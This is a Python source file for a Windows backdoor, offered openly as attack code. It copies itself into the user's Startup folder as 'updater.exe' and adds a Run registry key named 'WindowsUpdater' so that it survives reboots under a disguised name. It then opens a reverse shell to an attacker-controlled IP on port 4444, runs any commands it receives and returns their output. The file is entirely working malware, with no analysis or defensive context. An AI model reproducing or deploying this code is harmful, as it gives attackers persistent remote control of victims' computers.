import socket
import subprocess
import os
import sys
import time
import winreg as reg

# Set up the connection parameters
SERVER_IP = "192.168.1.10"  # Replace with the attacker's IP address
SERVER_PORT = 4444          # Replace with the desired port number
PERSISTENCE_REG_NAME = "WindowsUpdater"  # Name for the persistence entry
PERSISTENCE_FILE_NAME = "updater.exe"    # Name of the copied file

# Function to add persistence
def add_persistence():
    # Get the path to the current executable
    executable_path = os.path.abspath(sys.argv[0])
    
    # Create a copy of the executable in the startup folder
    startup_folder = os.getenv('APPDATA') + '\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'
    destination_path = os.path.join(startup_folder, PERSISTENCE_FILE_NAME)
    
    if not os.path.exists(destination_path):
        try:
            # Copy the executable to the startup folder
            os.system(f'copy "{executable_path}" "{destination_path}"')
            print(f'File copied to {destination_path}')
        except Exception as e:
            print(f'Failed to copy file: {str(e)}')
    
    # Add a registry entry for persistence
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    
    try:
        reg_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(reg_key, PERSISTENCE_REG_NAME, 0, reg.REG_SZ, destination_path)
        reg.CloseKey(reg_key)
        print(f'Registry entry added for persistence.')
    except Exception as e:
        print(f'Failed to add registry entry: {str(e)}')

def reverse_shell():
    # Create a socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Attempt to connect to the server
    while True:
        try:
            s.connect((SERVER_IP, SERVER_PORT))
            break
        except:
            time.sleep(10)  # Retry every 10 seconds if the connection fails
    
    # Loop to keep the connection alive and send commands
    while True:
        # Receive command from the server
        command = s.recv(1024).decode('utf-8')
        
        # If the command is "exit", break the loop and close the connection
        if command.lower() == "exit":
            break
        
        # Execute the command
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
        except subprocess.CalledProcessError as e:
            output = str(e.output)
        
        # Send the output back to the server
        s.send(output)
    
    # Close the socket connection
    s.close()

if __name__ == "__main__":
    add_persistence()
    reverse_shell()
